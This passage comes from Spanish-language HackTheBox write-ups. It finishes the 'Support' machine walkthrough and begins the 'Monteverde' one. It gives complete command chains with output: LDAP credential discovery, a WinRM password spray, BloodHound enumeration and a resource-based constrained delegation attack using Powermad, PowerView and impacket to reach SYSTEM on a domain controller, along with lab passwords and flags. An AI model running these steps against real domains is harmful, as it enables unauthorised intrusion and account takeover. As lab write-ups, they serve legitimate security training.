<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ldapsearch <span class="nt">-H</span> ldap://support.htb <span class="nt">-D</span> <span class="s1">'support\ldap'</span> <span class="nt">-w</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> <span class="nt">-b</span> <span class="s1">'CN=Users,DC=support,DC=htb'</span> | <span class="nb">grep </span>info:
info: Ironside47pleasure40Watchful
</code></pre></div></div>

<ul>
  <li>Al parecer es del usuario <code class="language-plaintext highlighter-rouge">Support</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>info: Ironside47pleasure40Watchful
memberOf: <span class="nv">CN</span><span class="o">=</span>Shared Support Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
memberOf: <span class="nv">CN</span><span class="o">=</span>Remote Management Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: <span class="nv">CqM5MfoxMEWepIBTs5an8Q</span><span class="o">==</span>
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: <span class="nv">AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA</span><span class="o">==</span>
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
</code></pre></div></div>

<ul>
  <li>Probando con <code class="language-plaintext highlighter-rouge">rpcclient</code> podemos conectarnos y enumerar los usuarios del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.129.245.29 <span class="nt">-c</span> <span class="s1">'enumdomusers'</span>
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ldap] rid:[0x450]
user:[support] rid:[0x451]
user:[smith.rosario] rid:[0x452]
user:[hernandez.stanley] rid:[0x453]
user:[wilson.shelby] rid:[0x454]
user:[anderson.damian] rid:[0x455]
user:[thomas.raphael] rid:[0x456]
user:[levine.leopoldo] rid:[0x457]
user:[raven.clifton] rid:[0x458]
user:[bardot.mary] rid:[0x459]
user:[cromwell.gerard] rid:[0x45a]
user:[monroe.david] rid:[0x45b]
user:[west.laura] rid:[0x45c]
user:[langley.lucy] rid:[0x45d]
user:[daughtler.mabel] rid:[0x45e]
user:[stoll.rachelle] rid:[0x45f]
user:[ford.victoria] rid:[0x460]
</code></pre></div></div>

<ul>
  <li>Como tenemos una contraseña vamos a guardar los usuarios en una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.129.245.29 <span class="nt">-c</span> <span class="s1">'enumdomusers'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\D*?\]'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
➜  content <span class="nb">cat </span>users.txt
Administrator
Guest
krbtgt
ldap
support
smith.rosario
hernandez.stanley
wilson.shelby
anderson.damian
thomas.raphael
levine.leopoldo
raven.clifton
bardot.mary
cromwell.gerard
monroe.david
west.laura
langley.lucy
daughtler.mabel
stoll.rachelle
ford.victoria
</code></pre></div></div>

<ul>
  <li>Vamos a ver si podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> con la contraseña que tenemos para ver si le pertenece a otro usuario por que con <code class="language-plaintext highlighter-rouge">rpcclient</code> vimos que es de <code class="language-plaintext highlighter-rouge">support</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.245.29 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'Ironside47pleasure40Watchful'</span> <span class="nt">--continue-on-success</span>
SMB         10.129.245.29   5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span>
HTTP        10.129.245.29   5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.245.29:5985/wsman
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\A</span>dministrator:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\G</span>uest:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\k</span>rbtgt:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>dap:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>+] support.htb<span class="se">\s</span>upport:Ironside47pleasure40Watchful <span class="o">(</span>Pwn3d!<span class="o">)</span>
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\s</span>mith.rosario:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\h</span>ernandez.stanley:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\w</span>ilson.shelby:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\a</span>nderson.damian:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\t</span>homas.raphael:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>evine.leopoldo:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\r</span>aven.clifton:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\b</span>ardot.mary:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\c</span>romwell.gerard:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\m</span>onroe.david:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\w</span>est.laura:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>angley.lucy:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\d</span>aughtler.mabel:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\s</span>toll.rachelle:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\f</span>ord.victoria:Ironside47pleasure40Watchful
</code></pre></div></div>

<ul>
  <li>Nos podemos conectar gracias a que el usuario <strong>support</strong> pertenece al grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> support.htb <span class="nt">-u</span> support <span class="nt">-p</span> Ironside47pleasure40Watchful

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>support<span class="se">\s</span>upport
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
05e7a42ec2aa2d13e6eaee5383b2ed97
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>
    <p>Para enumerar la maquina y poder ver vias potenciales de elevar nuestros privilegios vamos a usar <strong>Bloodhound</strong> <a href="https://www.kali.org/tools/bloodhound/">https://www.kali.org/tools/bloodhound/</a>.</p>
  </li>
  <li>
    <p>Para eso vas a necesitar descargar el <strong>.zip</strong> <a href="https://github.com/BloodHoundAD/SharpHound">https://github.com/BloodHoundAD/SharpHound</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip SharpHound-v2.3.3.zip
Archive:  SharpHound-v2.3.3.zip
  inflating: SharpHound.exe
  inflating: SharpHound.exe.config
  inflating: SharpHound.pdb
  inflating: SharpHound.ps1
  inflating: System.Console.dll
  inflating: System.Diagnostics.Tracing.dll
  inflating: System.Net.Http.dll
</code></pre></div></div>

<ul>
  <li>Ahora lo subimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/SharpHound.exe

Info: Uploading /home/miguel/Hackthebox/Support/content/SharpHound.exe to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\S</span>harpHound.exe

Data: 1791316 bytes of 1791316 bytes copied

Info: Upload successful!
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; .<span class="se">\S</span>harpHound.exe <span class="nt">-c</span> All
</code></pre></div></div>

<ul>
  <li>Ahora tenemos el comprimido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments


Mode                 LastWriteTime         Length Name
<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         3/29/2024   1:20 PM          22935 20240329132001_BloodHound.zip
<span class="nt">-a----</span>         3/29/2024   1:18 PM        1343488 SharpHound.exe
<span class="nt">-a----</span>         3/29/2024   1:20 PM          44570 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Ese <code class="language-plaintext highlighter-rouge">.zip</code> lo vamos a subir a <code class="language-plaintext highlighter-rouge">BloodHound</code> vamos a descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; download C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\2</span>0240329132001_BloodHound.zip info.zip

Info: Downloading C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\2</span>0240329132001_BloodHound.zip to info.zip

Info: Download successful!
</code></pre></div></div>

<ul>
  <li>Vemos que hay un grupo que se llama <strong>Shared Support Accounts</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; net group

Group Accounts <span class="k">for</span> <span class="se">\\</span>

<span class="nt">-------------------------------------------------------------------------------</span>
<span class="k">*</span>Cloneable Domain Controllers
<span class="k">*</span>DnsUpdateProxy
<span class="k">*</span>Domain Admins
<span class="k">*</span>Domain Computers
<span class="k">*</span>Domain Controllers
<span class="k">*</span>Domain Guests
<span class="k">*</span>Domain Users
<span class="k">*</span>Enterprise Admins
<span class="k">*</span>Enterprise Key Admins
<span class="k">*</span>Enterprise Read-only Domain Controllers
<span class="k">*</span>Group Policy Creator Owners
<span class="k">*</span>Key Admins
<span class="k">*</span>Protected Users
<span class="k">*</span>Read-only Domain Controllers
<span class="k">*</span>Schema Admins
<span class="k">*</span>Shared Support Accounts
The <span class="nb">command </span>completed with one or more errors.
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos ver eso en <strong>Bloodhound</strong>.</p>
  </li>
  <li>
    <p>El grupo <code class="language-plaintext highlighter-rouge">SHARED SUPPORT ACCOUNTS</code> tiene <code class="language-plaintext highlighter-rouge">GenericAll</code> en el <code class="language-plaintext highlighter-rouge">DC</code> .</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/priv.png" />
</p>

<h1 id="resource-based-constrained-delegation-attack">Resource based constrained delegation attack</h1>

<ul>
  <li>
    <p>En este post nos explican como funciona todo <a href="https://github.com/tothi/rbcd-attack">https://github.com/tothi/rbcd-attack</a>, <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation</a>.</p>
  </li>
  <li>
    <p>Para explotar esto necesitaremos de lo siguiente <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>, <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1</a>.</p>
  </li>
  <li>
    <p>Ahora lo subimos ala maquina y lo importamos para que lo interprete.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/PowerView.ps1

Info: Uploading /home/miguel/Hackthebox/Support/content/PowerView.ps1 to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\P</span>owerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments


Mode                 LastWriteTime         Length Name
<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         3/29/2024   1:20 PM          22935 20240329132001_BloodHound.zip
<span class="nt">-a----</span>         3/29/2024   2:34 PM         770279 PowerView.ps1
<span class="nt">-a----</span>         3/29/2024   1:18 PM        1343488 SharpHound.exe
<span class="nt">-a----</span>         3/29/2024   1:20 PM          44570 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\P</span>owerView.ps1
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/Powermad.ps1

Info: Uploading /home/miguel/Hackthebox/Support/content/Powermad.ps1 to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\P</span>owermad.ps1

Data: 180768 bytes of 180768 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\P</span>owermad.ps1
</code></pre></div></div>

<ul>
  <li>Vamos a comenzar creando un <strong>Computer object</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; New-MachineAccount <span class="nt">-MachineAccount</span> Nuevo <span class="nt">-Password</span> <span class="si">$(</span>ConvertTo-SecureString <span class="s1">'123456'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span><span class="si">)</span> <span class="nt">-Verbose</span>
Verbose: <span class="o">[</span>+] Domain Controller <span class="o">=</span> dc.support.htb
Verbose: <span class="o">[</span>+] Domain <span class="o">=</span> support.htb
Verbose: <span class="o">[</span>+] SAMAccountName <span class="o">=</span> Nuevo<span class="err">$</span>
Verbose: <span class="o">[</span>+] Distinguished Name <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Nuevo,CN<span class="o">=</span>Computers,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
<span class="o">[</span>+] Machine account Nuevo added
</code></pre></div></div>

<ul>
  <li>Comprobamos que exista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Get-DomainComputer Nuevo


pwdlastset             : 3/29/2024 2:39:18 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : <span class="nv">CN</span><span class="o">=</span>Nuevo,CN<span class="o">=</span>Computers,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
objectclass            : <span class="o">{</span>top, person, organizationalPerson, user...<span class="o">}</span>
name                   : Nuevo
objectsid              : S-1-5-21-1677581083-3380853377-188903654-6101
samaccountname         : Nuevo<span class="err">$</span>
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 3/29/2024 9:39:18 PM
instancetype           : 4
usncreated             : 90263
objectguid             : df9abf14-106b-4628-af15-0893a1ecf055
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : <span class="nv">CN</span><span class="o">=</span>Computer,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : <span class="o">{</span>RestrictedKrbHost/Nuevo, HOST/Nuevo, RestrictedKrbHost/Nuevo.support.htb, HOST/Nuevo.support.htb<span class="o">}</span>
ms-ds-creatorsid       : <span class="o">{</span>1, 5, 0, 0...<span class="o">}</span>
badpwdcount            : 0
cn                     : Nuevo
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 3/29/2024 9:39:18 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 90265
dnshostname            : Nuevo.support.htb
</code></pre></div></div>

<ul>
  <li>Vamos a seguir con los pasos que nos dan.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$ComputerSid</span> <span class="o">=</span> Get-DomainComputer Nuevo <span class="nt">-Properties</span> objectsid | Select <span class="nt">-Expand</span> objectsid
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SD</span> <span class="o">=</span> New-Object Security.AccessControl.RawSecurityDescriptor <span class="nt">-ArgumentList</span> <span class="s2">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="si">$(</span><span class="nv">$ComputerSid</span><span class="si">)</span><span class="s2">)"</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SDBytes</span> <span class="o">=</span> New-Object byte[] <span class="o">(</span><span class="nv">$SD</span>.BinaryLength<span class="o">)</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SD</span>.GetBinaryForm<span class="o">(</span><span class="nv">$SDBytes</span>, 0<span class="o">)</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Get-DomainComputer dc | Set-DomainObject <span class="nt">-Set</span> @<span class="o">{</span><span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span><span class="o">=</span><span class="nv">$SDBytes</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Ahora usaremos impacket para obtener un ticket suplantando al Administrator.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getST <span class="nt">-spn</span> cifs/dc.support.htb <span class="nt">-impersonate</span> Administrator <span class="nt">-dc-ip</span> 10.129.245.29 support.htb/Nuevo<span class="nv">$:</span>123456
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Ahora vamos a exportar la variable de entorno con el nombre del ticket.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Ahora ya nos podemos conectar y leer la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-psexec <span class="nt">-k</span> dc.support.htb
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on dc.support.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file GoDYfrro.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on dc.support.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service tmuw on dc.support.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service tmuw.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.20348.859]
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
7088702023ddab61e77faaf6ac6fcbc2
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Monteverde (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/10/monterverde.html" rel="alternate" type="text/html" title="HackTheBox - Monteverde (medium)" /><published>2024-04-10T00:00:00-06:00</published><updated>2024-04-10T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/10/monterverde</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/10/monterverde.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/00ceebe5dbef1106ce4390365cd787b4.png" />
</p>

<p>En este post vamos a estar haciendo la maquina Monteverde de la plataforma de Hack The Box donde mediante el protocolo RPC vamos a estar enumerando usuarios del dominio y gracias a que un usuario usa su nombre como contraseña vamos a poder conectarnos al servicio smb y leer una contraseña en texto plano después haremos un password spray para darnos cuenta a que usuario le pertenece la contraseña y conectarnos con evil-winrm para la escalada de privilegios abusaremos de que estamos en grupo Azure Admins Group.</p>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y los servicios que corre la maquina por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3269,5985,9389,49667,49673,49674,49676,49697 10.129.228.111 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-31 12:45 CST
Nmap scan report <span class="k">for </span>10.129.228.111
Host is up <span class="o">(</span>0.089s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-03-31 18:45:34Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   <span class="nb">date</span>: 2024-03-31T18:46:24
|_  start_date: N/A
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estamos ante un <strong>Windows 10</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.228.111
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar el nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s2">"10.129.228.111 MEGABANK.LOCAL"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.228.111 MEGABANK.LOCAL
</code></pre></div></div>

